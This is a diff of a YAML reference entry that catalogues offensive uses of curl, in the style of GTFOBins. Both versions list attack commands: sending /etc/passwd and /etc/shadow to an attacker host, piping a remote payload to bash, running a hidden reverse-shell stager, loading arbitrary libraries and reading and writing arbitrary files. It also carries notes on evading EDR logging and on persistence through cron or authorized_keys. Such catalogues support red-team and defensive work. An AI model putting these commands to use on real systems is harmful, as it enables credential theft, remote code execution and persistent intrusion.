@@ -1,75 +1,64 @@
 ---
 name: curl
-
 capabilities:
-  - read
-  - download
-  - upload
-  - exec
-
+- exec
+- read
+- write
+- upload
+- download
 required_permissions:
   level: user
-  notes: "No elevated permissions needed. SUID curl is rare but critical if present."
-
 difficulty: low
-
 opsec:
   noise: medium
   artifacts:
-    - "Shell history (~/.bash_history, ~/.zsh_history)"
-    - "Proxy/firewall logs for outbound HTTP/HTTPS"
-    - "/var/log/auth.log if curl used to pull and execute"
-  notes: >
-    Outbound HTTP(S) is logged by most enterprise proxies and EDRs with TLS
-    inspection. Prefer HTTPS to obscure payload content, but assume the
-    destination IP/domain is visible. Piping to sh/bash will trigger most
-    modern AV/EDR heuristics.
-
+  - ~/.bash_history
+  - Process arguments visible in ps and auditd
+  - File timestamps / inotify events on target paths
+  - Outbound network traffic to attacker host
+  notes: ''
 persistence_potential: true
-persistence_notes: >
-  Curl can download a cron payload, authorized_keys entry, or web shell and
-  write it in place if write permissions allow. Combine with a write-capable
-  binary for persistence chains.
-
 examples:
-  - id: download-file
-    description: "Fetch a remote file to disk."
-    capabilities: [download]
-    command: |
-      curl https://ATTACKER/file -o /tmp/file
-
-  - id: read-local-file
-    description: "Read a local file and send it to a remote server."
-    capabilities: [read, upload]
-    command: |
-      curl --data @/etc/passwd https://ATTACKER/collect
-
-  - id: exec-remote-payload
-    description: "Fetch and execute a remote shell script in memory."
-    capabilities: [exec, download]
-    command: |
-      curl https://ATTACKER/payload.sh | bash
-    notes: "Triggers pipe-to-shell detection on most EDRs. Use with caution."
-
-  - id: reverse-shell-via-exec
-    description: "Reverse shell using /dev/tcp after fetching stager."
-    capabilities: [exec, reverse-shell]
-    command: |
-      curl -s https://ATTACKER/stager.sh -o /tmp/.s && chmod +x /tmp/.s && /tmp/.s
-
-  - id: upload-exfil
-    description: "POST a file to a listener (e.g., netcat HTTP server)."
-    capabilities: [upload, read]
-    command: |
-      curl -F "f=@/etc/shadow" http://ATTACKER:8080/
-
+- id: download
+  description: Fetch a remote file to disk.
+  capabilities:
+  - download
+  command: curl http://attacker.com/path/to/input-file -o /path/to/output-file
+- id: file-read
+  description: Read an arbitrary file.
+  capabilities:
+  - read
+  command: curl file:///path/to/input-file
+- id: file-write
+  description: Write content to an arbitrary file.
+  capabilities:
+  - write
+  command: |-
+    echo DATA >/path/to/temp-file
+    curl file:///path/to/temp-file -o /path/to/output-file
+- id: library-load
+  description: Load an arbitrary shared library.
+  capabilities:
+  - exec
+  command: curl --engine /path/to/lib.so x
+- id: upload
+  description: Send a local file to a remote host.
+  capabilities:
+  - upload
+  command: curl -X POST --data-binary @/path/to/input-file http://attacker.com
+- id: upload-2
+  description: Send a local file to a remote host.
+  capabilities:
+  - upload
+  command: curl -X POST --data-binary DATA http://attacker.com
+- id: upload-3
+  description: Send a local file to a remote host.
+  capabilities:
+  - upload
+  command: curl gopher://attacker.com:12345/_DATA
+  notes: Data will be `\r\n` terminated.
 references:
-  - "https://gtfobins.github.io/gtfobins/curl/"
-  - "https://curl.se/docs/manpage.html"
-
-tags:
-  - http
-  - exfil
-  - stager
-  - file-transfer
+- https://gtfobins.github.io/gtfobins/curl/
+tags: []
+persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
 ---
